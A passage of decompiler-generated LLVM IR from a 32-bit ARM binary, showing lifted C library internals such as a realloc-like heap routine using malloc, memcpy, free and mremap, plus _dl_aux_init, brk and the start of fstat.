  store i32 %v2_1b71c, i32* %r2.global-to-local, align 4
  %v1_1b720 = or i32 %v2_1b710, 1
  store i32 %v1_1b720, i32* %r3.global-to-local, align 4
  store i32 %v0_1b6b8, i32* @r4, align 4
  store i32 %v2_1b71c, i32* %v2_1b6b8, align 4
  %v0_1b72c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_1b72c, i32* @global_var_34748.1431, align 4
  %v0_1b730 = load i32, i32* %r3.global-to-local, align 4
  %v2_1b730 = add i32 %v0_1b72c, 4
  %v3_1b730 = inttoptr i32 %v2_1b730 to i32*
  store i32 %v0_1b730, i32* %v3_1b730, align 4
  br label %dec_label_pc_1b96c

dec_label_pc_1b738:                               ; preds = %dec_label_pc_1b6e4
  %v1_1b738 = and i32 %v3_1b6f4, -2
  %v2_1b73c = add i32 %v1_1b738, %v2_1b6ec
  store i32 %v2_1b73c, i32* %r3.global-to-local, align 4
  %v1_1b740 = add i32 %v2_1b73c, 4
  %v2_1b740 = inttoptr i32 %v1_1b740 to i32*
  %v3_1b740 = load i32, i32* %v2_1b740, align 4
  store i32 %v3_1b740, i32* %r3.global-to-local, align 4
  %v1_1b744 = urem i32 %v3_1b740, 2
  %v2_1b744 = icmp eq i32 %v1_1b744, 0
  br i1 %v2_1b744, label %dec_label_pc_1b74c, label %dec_label_pc_1b78c

dec_label_pc_1b74c:                               ; preds = %dec_label_pc_1b738
  %v1_1b74c = and i32 %v3_1b6f4, -4
  store i32 %v1_1b74c, i32* %r3.global-to-local, align 4
  %v2_1b750 = add i32 %v1_1b74c, %v1_1b6d0
  store i32 %v2_1b750, i32* %r0.global-to-local, align 4
  %v3_1b754 = icmp ult i32 %v2_1b750, %v1_1b6d8
  br i1 %v3_1b754, label %dec_label_pc_1b78c, label %dec_label_pc_1b75c

dec_label_pc_1b75c:                               ; preds = %dec_label_pc_1b74c
  %v1_1b75c = add i32 %v1_1b6d0, %v0_1b6b8
  %v2_1b75c = inttoptr i32 %v1_1b75c to i32*
  %v3_1b75c = load i32, i32* %v2_1b75c, align 4
  store i32 %v3_1b75c, i32* %r1.global-to-local, align 4
  %v1_1b760 = add i32 %v3_1b75c, 12
  %v2_1b760 = inttoptr i32 %v1_1b760 to i32*
  %v3_1b760 = load i32, i32* %v2_1b760, align 4
  store i32 %v3_1b760, i32* %r3.global-to-local, align 4
  %v9_1b764 = icmp eq i32 %v3_1b760, %v2_1b6ec
  %v1_1b768 = add i32 %v2_1b6ec, 12
  %v2_1b768 = inttoptr i32 %v1_1b768 to i32*
  %v3_1b768 = load i32, i32* %v2_1b768, align 4
  store i32 %v3_1b768, i32* %r2.global-to-local, align 4
  br i1 %v9_1b764, label %dec_label_pc_1b770, label %dec_label_pc_1b77c

dec_label_pc_1b770:                               ; preds = %dec_label_pc_1b75c
  %v1_1b770 = add i32 %v3_1b768, 8
  %v2_1b770 = inttoptr i32 %v1_1b770 to i32*
  %v3_1b770 = load i32, i32* %v2_1b770, align 4
  store i32 %v3_1b770, i32* %r3.global-to-local, align 4
  %v9_1b774 = icmp eq i32 %v3_1b770, %v2_1b6ec
  br i1 %v9_1b774, label %dec_label_pc_1b780, label %dec_label_pc_1b77c

dec_label_pc_1b77c:                               ; preds = %dec_label_pc_1b75c, %dec_label_pc_1b770
  %v0_1b77c = call i32 @abort()
  store i32 %v0_1b77c, i32* %r0.global-to-local, align 4
  %v0_1b780.pre = load i32, i32* @r1, align 4
  %v1_1b780.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_1b780

dec_label_pc_1b780:                               ; preds = %dec_label_pc_1b770, %dec_label_pc_1b77c
  %v1_1b780 = phi i32 [ %v3_1b768, %dec_label_pc_1b770 ], [ %v1_1b780.pre, %dec_label_pc_1b77c ]
  %v0_1b780 = phi i32 [ %v3_1b75c, %dec_label_pc_1b770 ], [ %v0_1b780.pre, %dec_label_pc_1b77c ]
  %v2_1b780 = add i32 %v1_1b780, 8
  %v3_1b780 = inttoptr i32 %v2_1b780 to i32*
  store i32 %v0_1b780, i32* %v3_1b780, align 4
  %v0_1b784 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b784 = load i32, i32* %r1.global-to-local, align 4
  %v2_1b784 = add i32 %v1_1b784, 12
  %v3_1b784 = inttoptr i32 %v2_1b784 to i32*
  store i32 %v0_1b784, i32* %v3_1b784, align 4
  %v1_1b840.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1b840

dec_label_pc_1b78c:                               ; preds = %dec_label_pc_1b6fc, %dec_label_pc_1b74c, %dec_label_pc_1b738
  %v1_1b78c = add i32 %v1_1b6d8, -7
  store i32 %v1_1b78c, i32* %r0.global-to-local, align 4
  %v1_1b790 = call i32 @malloc(i32 %v1_1b78c)
  store i32 %v1_1b790, i32* @r0, align 4
  store i32 %v1_1b790, i32* %r1.global-to-local, align 4
  %v2_1b794 = icmp eq i32 %v1_1b790, 0
  br i1 %v2_1b794, label %bb27, label %dec_label_pc_1b7a0

bb27:                                             ; preds = %dec_label_pc_1b78c
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_1b96c

dec_label_pc_1b7a0:                               ; preds = %dec_label_pc_1b78c
  %v1_1b7a8.pre = load i32, i32* @r4, align 4
  %v1_1b7a0 = add i32 %v1_1b790, -4
  %v2_1b7a0 = inttoptr i32 %v1_1b7a0 to i32*
  %v3_1b7a0 = load i32, i32* %v2_1b7a0, align 4
  store i32 %v3_1b7a0, i32* %r3.global-to-local, align 4
  %v1_1b7a4 = add i32 %v1_1b790, -8
  store i32 %v1_1b7a4, i32* @r7, align 4
  %v9_1b7a8 = icmp eq i32 %v1_1b7a4, %v1_1b7a8.pre
  br i1 %v9_1b7a8, label %.thread2, label %dec_label_pc_1b7b8

.thread2:                                         ; preds = %dec_label_pc_1b7a0
  %v2_1b7ac = and i32 %v3_1b7a0, -4
  store i32 %v2_1b7ac, i32* %r3.global-to-local, align 4
  %v2_1b7b0 = load i32, i32* @r6, align 4
  %v3_1b7b0 = add i32 %v2_1b7b0, %v2_1b7ac
  store i32 %v3_1b7b0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1b840

dec_label_pc_1b7b8:                               ; preds = %dec_label_pc_1b7a0
  %v0_1b7b8 = load i32, i32* @r6, align 4
  %v1_1b7b8 = add i32 %v0_1b7b8, -4
  store i32 %v1_1b7b8, i32* @r2, align 4
  %v3_1b7bc = udiv i32 %v1_1b7b8, 4
  store i32 %v3_1b7bc, i32* @ip, align 4
  %tmp33 = and i32 %v1_1b7b8, -4
  %tmp34 = icmp eq i32 %tmp33, 36
  %v2_1b7c4 = icmp ult i32 %v1_1b7b8, 36
  %v3_1b7c4 = or i1 %tmp34, %v2_1b7c4
  %v0_1b7d4 = load i32, i32* @r5, align 4
  br i1 %v3_1b7c4, label %dec_label_pc_1b7d4, label %dec_label_pc_1b7c8

dec_label_pc_1b7c8:                               ; preds = %dec_label_pc_1b7b8
  store i32 %v0_1b7d4, i32* @r1, align 4
  %v0_1b7cc = call i32 @memcpy()
  store i32 %v0_1b7cc, i32* %r0.global-to-local, align 4
  br label %.thread6

dec_label_pc_1b7d4:                               ; preds = %dec_label_pc_1b7b8
  %v1_1b7d4 = inttoptr i32 %v0_1b7d4 to i32*
  %v2_1b7d4 = load i32, i32* %v1_1b7d4, align 4
  store i32 %v2_1b7d4, i32* %r3.global-to-local, align 4
  %v2_1b7d8 = inttoptr i32 %v1_1b790 to i32*
  store i32 %v2_1b7d4, i32* %v2_1b7d8, align 4
  %v0_1b7dc = load i32, i32* @r5, align 4
  %v1_1b7dc = add i32 %v0_1b7dc, 4
  %v2_1b7dc = inttoptr i32 %v1_1b7dc to i32*
  %v3_1b7dc = load i32, i32* %v2_1b7dc, align 4
  store i32 %v3_1b7dc, i32* %r3.global-to-local, align 4
  %v1_1b7e0 = load i32, i32* %r1.global-to-local, align 4
  %v2_1b7e0 = add i32 %v1_1b7e0, 4
  %v3_1b7e0 = inttoptr i32 %v2_1b7e0 to i32*
  store i32 %v3_1b7dc, i32* %v3_1b7e0, align 4
  %v0_1b7e4 = load i32, i32* @r5, align 4
  %v1_1b7e4 = add i32 %v0_1b7e4, 8
  %v2_1b7e4 = inttoptr i32 %v1_1b7e4 to i32*
  %v3_1b7e4 = load i32, i32* %v2_1b7e4, align 4
  store i32 %v3_1b7e4, i32* %r3.global-to-local, align 4
  %v0_1b7e8 = load i32, i32* @ip, align 4
  %v1_1b7ec = load i32, i32* %r1.global-to-local, align 4
  %v2_1b7ec = add i32 %v1_1b7ec, 8
  %v3_1b7ec = inttoptr i32 %v2_1b7ec to i32*
  store i32 %v3_1b7e4, i32* %v3_1b7ec, align 4
  %tmp35 = icmp ult i32 %v0_1b7e8, 5
  br i1 %tmp35, label %.thread6, label %dec_label_pc_1b7f4

dec_label_pc_1b7f4:                               ; preds = %dec_label_pc_1b7d4
  %v0_1b7f4 = load i32, i32* @r5, align 4
  %v1_1b7f4 = add i32 %v0_1b7f4, 12
  %v2_1b7f4 = inttoptr i32 %v1_1b7f4 to i32*
  %v3_1b7f4 = load i32, i32* %v2_1b7f4, align 4
  store i32 %v3_1b7f4, i32* %r3.global-to-local, align 4
  %v1_1b7f8 = load i32, i32* %r1.global-to-local, align 4
  %v2_1b7f8 = add i32 %v1_1b7f8, 12
  %v3_1b7f8 = inttoptr i32 %v2_1b7f8 to i32*
  store i32 %v3_1b7f4, i32* %v3_1b7f8, align 4
  %v0_1b7fc = load i32, i32* @r5, align 4
  %v1_1b7fc = add i32 %v0_1b7fc, 16
  %v2_1b7fc = inttoptr i32 %v1_1b7fc to i32*
  %v3_1b7fc = load i32, i32* %v2_1b7fc, align 4
  store i32 %v3_1b7fc, i32* %r3.global-to-local, align 4
  %v0_1b800 = load i32, i32* @ip, align 4
  %v1_1b804 = load i32, i32* %r1.global-to-local, align 4
  %v2_1b804 = add i32 %v1_1b804, 16
  %v3_1b804 = inttoptr i32 %v2_1b804 to i32*
  store i32 %v3_1b7fc, i32* %v3_1b804, align 4
  %tmp36 = icmp ult i32 %v0_1b800, 7
  br i1 %tmp36, label %.thread6, label %dec_label_pc_1b80c

dec_label_pc_1b80c:                               ; preds = %dec_label_pc_1b7f4
  %v0_1b80c = load i32, i32* @r5, align 4
  %v1_1b80c = add i32 %v0_1b80c, 20
  %v2_1b80c = inttoptr i32 %v1_1b80c to i32*
  %v3_1b80c = load i32, i32* %v2_1b80c, align 4
  store i32 %v3_1b80c, i32* %r3.global-to-local, align 4
  %v1_1b810 = load i32, i32* %r1.global-to-local, align 4
  %v2_1b810 = add i32 %v1_1b810, 20
  %v3_1b810 = inttoptr i32 %v2_1b810 to i32*
  store i32 %v3_1b80c, i32* %v3_1b810, align 4
  %v0_1b814 = load i32, i32* @r5, align 4
  %v1_1b814 = add i32 %v0_1b814, 24
  %v2_1b814 = inttoptr i32 %v1_1b814 to i32*
  %v3_1b814 = load i32, i32* %v2_1b814, align 4
  store i32 %v3_1b814, i32* %r3.global-to-local, align 4
  %v1_1b818 = load i32, i32* %r1.global-to-local, align 4
  %v2_1b818 = add i32 %v1_1b818, 24
  %v3_1b818 = inttoptr i32 %v2_1b818 to i32*
  store i32 %v3_1b814, i32* %v3_1b818, align 4
  %v0_1b81c = load i32, i32* @ip, align 4
  %v7_1b81c = icmp eq i32 %v0_1b81c, 9
  br i1 %v7_1b81c, label %bb28, label %.thread6

bb28:                                             ; preds = %dec_label_pc_1b80c
  %v1_1b820 = load i32, i32* @r5, align 4
  %v2_1b820 = add i32 %v1_1b820, 28
  %v3_1b820 = inttoptr i32 %v2_1b820 to i32*
  %v4_1b820 = load i32, i32* %v3_1b820, align 4
  store i32 %v4_1b820, i32* %r3.global-to-local, align 4
  %v2_1b824 = load i32, i32* %r1.global-to-local, align 4
  %v3_1b824 = add i32 %v2_1b824, 28
  %v4_1b824 = inttoptr i32 %v3_1b824 to i32*
  store i32 %v4_1b820, i32* %v4_1b824, align 4
  %v1_1b828 = load i32, i32* @r5, align 4
  %v2_1b828 = add i32 %v1_1b828, 32
  %v3_1b828 = inttoptr i32 %v2_1b828 to i32*
  %v4_1b828 = load i32, i32* %v3_1b828, align 4
  store i32 %v4_1b828, i32* %r3.global-to-local, align 4
  %v2_1b82c = load i32, i32* %r1.global-to-local, align 4
  %v3_1b82c = add i32 %v2_1b82c, 32
  %v4_1b82c = inttoptr i32 %v3_1b82c to i32*
  store i32 %v4_1b828, i32* %v4_1b82c, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_1b80c, %dec_label_pc_1b7f4, %dec_label_pc_1b7d4, %dec_label_pc_1b7c8, %bb28
  %v0_1b830 = load i32, i32* @r5, align 4
  store i32 %v0_1b830, i32* @r0, align 4
  %v0_1b834 = call i32 @free()
  store i32 %v0_1b834, i32* %r0.global-to-local, align 4
  %v0_1b838 = load i32, i32* @r7, align 4
  %v1_1b838 = add i32 %v0_1b838, 8
  store i32 %v1_1b838, i32* @r4, align 4
  br label %dec_label_pc_1b96c

dec_label_pc_1b840:                               ; preds = %bb26, %.thread2, %dec_label_pc_1b780
  %v0_1b854 = phi i32 [ %v3_1b7b0, %.thread2 ], [ %v1_1b6d0, %bb26 ], [ %v1_1b840.pre, %dec_label_pc_1b780 ]
  %v0_1b840 = load i32, i32* @sb, align 4
  %v2_1b840 = sub i32 %v0_1b854, %v0_1b840
  store i32 %v2_1b840, i32* %r1.global-to-local, align 4
  %v0_1b848 = load i32, i32* @sl, align 4
  %v1_1b848 = add i32 %v0_1b848, 4
  %v2_1b848 = inttoptr i32 %v1_1b848 to i32*
  %v3_1b848 = load i32, i32* %v2_1b848, align 4
  %tmp37 = icmp ugt i32 %v2_1b840, 15
  %v1_1b870 = urem i32 %v3_1b848, 2
  store i32 %v1_1b870, i32* %r3.global-to-local, align 4
  br i1 %tmp37, label %dec_label_pc_1b870, label %dec_label_pc_1b850

dec_label_pc_1b850:                               ; preds = %dec_label_pc_1b840
  %v2_1b854 = or i32 %v1_1b870, %v0_1b854
  store i32 %v2_1b854, i32* %r3.global-to-local, align 4
  store i32 %v2_1b854, i32* %v2_1b848, align 4
  %v0_1b85c = load i32, i32* @sl, align 4
  %v1_1b85c = load i32, i32* %r0.global-to-local, align 4
  %v2_1b85c = add i32 %v1_1b85c, %v0_1b85c
  store i32 %v2_1b85c, i32* %r2.global-to-local, align 4
  %v1_1b860 = add i32 %v2_1b85c, 4
  %v2_1b860 = inttoptr i32 %v1_1b860 to i32*
  %v3_1b860 = load i32, i32* %v2_1b860, align 4
  %v1_1b864 = or i32 %v3_1b860, 1
  store i32 %v1_1b864, i32* %r3.global-to-local, align 4
  store i32 %v1_1b864, i32* %v2_1b860, align 4
  br label %dec_label_pc_1b8a0

dec_label_pc_1b870:                               ; preds = %dec_label_pc_1b840
  %v2_1b874 = add i32 %v0_1b848, %v0_1b840
  store i32 %v2_1b874, i32* %r0.global-to-local, align 4
  %v2_1b878 = or i32 %v1_1b870, %v0_1b840
  store i32 %v2_1b878, i32* %r3.global-to-local, align 4
  %v1_1b87c = or i32 %v2_1b840, 1
  store i32 %v1_1b87c, i32* %r2.global-to-local, align 4
  store i32 %v2_1b878, i32* %v2_1b848, align 4
  %v0_1b884 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b884 = load i32, i32* %r0.global-to-local, align 4
  %v2_1b884 = add i32 %v1_1b884, 4
  %v3_1b884 = inttoptr i32 %v2_1b884 to i32*
  store i32 %v0_1b884, i32* %v3_1b884, align 4
  %v0_1b888 = load i32, i32* %r0.global-to-local, align 4
  %v1_1b888 = load i32, i32* %r1.global-to-local, align 4
  %v2_1b888 = add i32 %v1_1b888, %v0_1b888
  store i32 %v2_1b888, i32* %r2.global-to-local, align 4
  %v1_1b88c = add i32 %v2_1b888, 4
  %v2_1b88c = inttoptr i32 %v1_1b88c to i32*
  %v3_1b88c = load i32, i32* %v2_1b88c, align 4
  %v1_1b890 = or i32 %v3_1b88c, 1
  store i32 %v1_1b890, i32* %r3.global-to-local, align 4
  store i32 %v1_1b890, i32* %v2_1b88c, align 4
  %v0_1b898 = load i32, i32* %r0.global-to-local, align 4
  %v1_1b898 = add i32 %v0_1b898, 8
  store i32 %v1_1b898, i32* @r0, align 4
  %v0_1b89c = call i32 @free()
  store i32 %v0_1b89c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1b8a0

dec_label_pc_1b8a0:                               ; preds = %dec_label_pc_1b850, %dec_label_pc_1b870
  %v0_1b8a0 = load i32, i32* @sl, align 4
  %v1_1b8a0 = add i32 %v0_1b8a0, 8
  store i32 %v1_1b8a0, i32* @r4, align 4
  br label %dec_label_pc_1b96c

dec_label_pc_1b8a8:                               ; preds = %bb25
  store i32 ptrtoint (i32* @global_var_3471c.1425 to i32), i32* @r8, align 4
  %v2_1b8ac = inttoptr i32 %v1_1b6cc to i32*
  %v3_1b8ac = load i32, i32* %v2_1b8ac, align 4
  store i32 %v3_1b8ac, i32* @r4, align 4
  %v3_1b8b0 = load i32, i32* @global_var_34a78.1432, align 4
  %v1_1b8b4 = add i32 %v3_1b8ac, 4
  %v1_1b8b8 = add i32 %v3_1b8b0, -1
  store i32 %v1_1b8b8, i32* %r2.global-to-local, align 4
  %v2_1b8bc = add i32 %v1_1b8b4, %v1_1b8b8
  %v1_1b8c0 = load i32, i32* @sb, align 4
  %v2_1b8c0 = add i32 %v2_1b8bc, %v1_1b8c0
  store i32 %v2_1b8c0, i32* %r3.global-to-local, align 4
  %v2_1b8c4 = sub i32 0, %v3_1b8b0
  %v3_1b8c4 = and i32 %v2_1b8c0, %v2_1b8c4
  store i32 %v3_1b8c4, i32* @r7, align 4
  %v2_1b8c8 = sub i32 %v3_1b8c4, %v3_1b8ac
  store i32 %v2_1b8c8, i32* @fp, align 4
  %v9_1b8cc = icmp eq i32 %v1_1b6d0, %v2_1b8c8
  br i1 %v9_1b8cc, label %dec_label_pc_1b940, label %dec_label_pc_1b8d4

dec_label_pc_1b8d4:                               ; preds = %dec_label_pc_1b8a8
  %v2_1b8d4 = sub i32 %v1_1b6cc, %v3_1b8ac
  store i32 %v2_1b8d4, i32* %r0.global-to-local, align 4
  %v2_1b8d8 = add i32 %v3_1b8ac, %v1_1b6d0
  store i32 %v2_1b8d8, i32* %r1.global-to-local, align 4
  store i32 %v3_1b8c4, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_1b8e4 = call i32 @mremap()
  store i32 %v0_1b8e4, i32* %r0.global-to-local, align 4
  %v7_1b8e8 = icmp eq i32 %v0_1b8e4, -1
  br i1 %v7_1b8e8, label %dec_label_pc_1b934, label %dec_label_pc_1b8f0

dec_label_pc_1b8f0:                               ; preds = %dec_label_pc_1b8d4
  %v1_1b8f0 = load i32, i32* @r4, align 4
  %v2_1b8f0 = add i32 %v1_1b8f0, %v0_1b8e4
  store i32 %v2_1b8f0, i32* %r0.global-to-local, align 4
  %v0_1b8f4 = load i32, i32* @fp, align 4
  %v1_1b8f4 = or i32 %v0_1b8f4, 2
  %v2_1b8f8 = add i32 %v2_1b8f0, 4
  %v3_1b8f8 = inttoptr i32 %v2_1b8f8 to i32*
  store i32 %v1_1b8f4, i32* %v3_1b8f8, align 4
  %v3_1b8fc = load i32, i32* @global_var_34a80.1438, align 4
  %v3_1b900 = load i32, i32* @global_var_34a8c.1439, align 4
  %v0_1b904 = load i32, i32* @r6, align 4
  %v2_1b904 = sub i32 %v3_1b8fc, %v0_1b904
  %v1_1b908 = load i32, i32* @r7, align 4
  %v2_1b908 = add i32 %v1_1b908, %v2_1b904
  store i32 %v2_1b908, i32* %r1.global-to-local, align 4
  %v3_1b90c = load i32, i32* @global_var_34a84.1440, align 4
  store i32 %v3_1b90c, i32* %r3.global-to-local, align 4
  %v3_1b914 = load i32, i32* @global_var_34a90.1441, align 4
  store i32 %v3_1b914, i32* %r2.global-to-local, align 4
  %tmp38 = icmp ugt i32 %v2_1b908, %v3_1b900
  br i1 %tmp38, label %bb29, label %bb30

bb29:                                             ; preds = %dec_label_pc_1b8f0
  store i32 %v2_1b908, i32* @global_var_34a8c.1439, align 4
  br label %bb30

bb30:                                             ; preds = %dec_label_pc_1b8f0, %bb29
  store i32 %v2_1b908, i32* @global_var_34a80.1438, align 4
  %v2_1b920 = add i32 %v3_1b90c, %v2_1b908
  store i32 %v2_1b920, i32* %r1.global-to-local, align 4
  %v0_1b928 = load i32, i32* %r0.global-to-local, align 4
  %v1_1b928 = add i32 %v0_1b928, 8
  store i32 %v1_1b928, i32* @r4, align 4
  %tmp39 = icmp ugt i32 %v2_1b920, %v3_1b914
  br i1 %tmp39, label %bb31, label %dec_label_pc_1b96c

bb31:                                             ; preds = %bb30
  store i32 %v2_1b920, i32* @global_var_34a90.1441, align 4
  br label %dec_label_pc_1b96c

dec_label_pc_1b934:                               ; preds = %dec_label_pc_1b8d4
  %v0_1b934 = load i32, i32* @sb, align 4
  %v1_1b934 = add i32 %v0_1b934, 4
  store i32 %v1_1b934, i32* %r3.global-to-local, align 4
  %v0_1b938 = load i32, i32* @r6, align 4
  %v3_1b938 = icmp ult i32 %v0_1b938, %v1_1b934
  br i1 %v3_1b938, label %dec_label_pc_1b948, label %dec_label_pc_1b934.dec_label_pc_1b940_crit_edge

dec_label_pc_1b934.dec_label_pc_1b940_crit_edge:  ; preds = %dec_label_pc_1b934
  %v0_1b940.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1b940

dec_label_pc_1b940:                               ; preds = %dec_label_pc_1b934.dec_label_pc_1b940_crit_edge, %dec_label_pc_1b8a8
  %v0_1b940 = phi i32 [ %v0_1b940.pre, %dec_label_pc_1b934.dec_label_pc_1b940_crit_edge ], [ %v0_1b6b8, %dec_label_pc_1b8a8 ]
  store i32 %v0_1b940, i32* @r4, align 4
  br label %dec_label_pc_1b96c

dec_label_pc_1b948:                               ; preds = %dec_label_pc_1b934
  %v1_1b948 = add i32 %v0_1b934, -7
  store i32 %v1_1b948, i32* %r0.global-to-local, align 4
  %v1_1b94c = call i32 @malloc(i32 %v1_1b948)
  store i32 %v1_1b94c, i32* @r0, align 4
  store i32 %v1_1b94c, i32* @r4, align 4
  %v2_1b950 = icmp eq i32 %v1_1b94c, 0
  br i1 %v2_1b950, label %dec_label_pc_1b96c, label %dec_label_pc_1b958

dec_label_pc_1b958:                               ; preds = %dec_label_pc_1b948
  %v0_1b958 = load i32, i32* @r6, align 4
  %v1_1b958 = add i32 %v0_1b958, -8
  store i32 %v1_1b958, i32* @r2, align 4
  %v0_1b95c = load i32, i32* @r5, align 4
  store i32 %v0_1b95c, i32* @r1, align 4
  %v0_1b960 = call i32 @memcpy()
  %v0_1b964 = load i32, i32* @r5, align 4
  store i32 %v0_1b964, i32* @r0, align 4
  %v0_1b968 = call i32 @free()
  store i32 %v0_1b968, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1b96c

dec_label_pc_1b96c:                               ; preds = %bb27, %bb31, %bb30, %dec_label_pc_1b948, %dec_label_pc_1b940, %dec_label_pc_1b8a0, %.thread6, %dec_label_pc_1b710, %dec_label_pc_1b958
  store i32 %v2_1b644, i32* @r0, align 4
  store i32 1, i32* @r1, align 4
  store i32 98448, i32* %r3.global-to-local, align 4
  store i32 113024, i32* @lr, align 4
  %v1_1b97c = call i32 @_pthread_cleanup_pop_restore()
  store i32 %v1_1b97c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1b980

dec_label_pc_1b980:                               ; preds = %dec_label_pc_1b6a0, %dec_label_pc_1b668, %dec_label_pc_1b650, %dec_label_pc_1b96c
  %v0_1b980 = load i32, i32* @r4, align 4
  store i32 %v0_1b980, i32* %r0.global-to-local, align 4
  store i32 %v3_1b63c, i32* @r4, align 4
  store i32 %v6_1b63c, i32* @r5, align 4
  store i32 %v9_1b63c, i32* @r6, align 4
  store i32 %v12_1b63c, i32* @r7, align 4
  store i32 %v15_1b63c, i32* @r8, align 4
  store i32 %v18_1b63c, i32* @sb, align 4
  store i32 %v21_1b63c, i32* @sl, align 4
  store i32 %v24_1b63c, i32* @fp, align 4
  ret i32 %v0_1b980

; uselistorder directives
  uselistorder i32 %v2_1b920, { 1, 0, 2 }
  uselistorder i32 %v2_1b908, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_1b8e4, { 1, 0, 2 }
  uselistorder i32 %v1_1b870, { 2, 1, 0 }
  uselistorder i32 %v2_1b840, { 1, 0, 2 }
  uselistorder i32 %v0_1b7d4, { 1, 0 }
  uselistorder i32 %v1_1b790, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v3_1b6f4, { 0, 2, 1, 3 }
  uselistorder i32 %v2_1b6ec, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 %v1_1b6d8, { 3, 5, 0, 1, 2, 4, 6 }
  uselistorder i32 %v1_1b6d0, { 0, 7, 5, 1, 2, 3, 4, 6, 8, 9 }
  uselistorder i32 %v1_1b6cc, { 2, 3, 0, 1, 4 }
  uselistorder i1 %v2_1b6bc, { 1, 0 }
  uselistorder i32 %v0_1b6b8, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_1b698, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 4, 5, 6, 8, 7, 13, 9, 10, 11, 12, 23, 14, 16, 15, 17, 22, 24, 18, 19, 20, 21, 26, 0, 25, 27, 29, 28 }
  uselistorder i32* @global_var_34a84.1440, { 1, 2, 3, 4, 5, 6, 7, 0, 8, 9, 10 }
  uselistorder i32 ()* @abort, { 6, 0, 2, 1, 5, 4, 3, 7 }
  uselistorder i32* @global_var_34748.1431, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10 }
  uselistorder i32 ptrtoint (i32* @global_var_3471c.1425 to i32), { 4, 5, 3, 6, 0, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 1, 2, 19, 20, 21, 22 }
  uselistorder i32 ptrtoint (i32* @global_var_2e330.1421 to i32), { 0, 4, 5, 1, 6, 2, 7, 8, 3, 9, 10 }
  uselistorder i32* null, { 1, 2, 3, 0, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 17, 15, 18, 19, 20, 21, 22, 23, 29, 30, 27, 28, 26, 25, 24, 31, 32, 33, 4 }
  uselistorder i32 %arg2, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_1b980, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1b96c, { 8, 3, 4, 1, 2, 5, 6, 0, 7 }
  uselistorder label %bb30, { 1, 0 }
  uselistorder label %dec_label_pc_1b8a0, { 1, 0 }
  uselistorder label %dec_label_pc_1b840, { 1, 2, 0 }
  uselistorder label %.thread6, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_1b78c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1b780, { 1, 0 }
  uselistorder label %dec_label_pc_1b77c, { 1, 0 }
  uselistorder label %bb25, { 1, 0 }
  uselistorder label %bb23, { 1, 0 }
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %v1_1b9a4 = add i32 %arg1, 28
  %v2_1b9a4 = inttoptr i32 %v1_1b9a4 to i32*
  %v3_1b9a4 = load i32, i32* %v2_1b9a4, align 4
  %v1_1b9ac = add i32 %arg1, 44
  %v2_1b9ac = inttoptr i32 %v1_1b9ac to i32*
  %v3_1b9ac = load i32, i32* %v2_1b9ac, align 4
  store i32 %v3_1b9a4, i32* @global_var_34a94.1697, align 4
  store i32 %v3_1b9ac, i32* @global_var_34a98.1699, align 4
  ret i32 %arg1
}

define i32 @__GI_brk(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_1b9d0 = call i32 @brk(i32* %arg1)
  %v3_1b9d4 = icmp ult i32 %v2_1b9d0, %tmp
  store i32 %v2_1b9d0, i32* @global_var_34690.1588, align 4
  br i1 %v3_1b9d4, label %.thread, label %bb

bb:                                               ; preds = %entry
  ret i32 0

.thread:                                          ; preds = %entry
  %v0_1b9e8 = call i32 @__GI___errno_location()
  %v2_1b9f0 = inttoptr i32 %v0_1b9e8 to i32*
  store i32 12, i32* %v2_1b9f0, align 4
  ret i32 -1
}

define i32 @fstat() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %v2_1ba04 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_1ba04, i32* @r1, align 4
  %v0_1ba10 = call i32 @fstat()
  store i32 %v0_1ba10, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1ba10, -4095
  br i1 %tmp, label %dec_label_pc_1ba34, label %dec_label_pc_1ba20

dec_label_pc_1ba20:                               ; preds = %entry
  %v0_1ba20 = call i32 @__GI___errno_location()
  %v0_1ba24 = load i32, i32* %r4.global-to-local, align 4
  %v1_1ba24 = sub i32 0, %v0_1ba24
  store i32 %v1_1ba24, i32* @r3, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_1ba2c = inttoptr i32 %v0_1ba20 to i32*
  store i32 %v1_1ba24, i32* %v2_1ba2c, align 4
  br label %dec_label_pc_1ba44

dec_label_pc_1ba34:                               ; preds = %entry
  %v2_1ba34 = icmp eq i32 %v0_1ba10, 0
  br i1 %v2_1ba34, label %bb, label %.thread

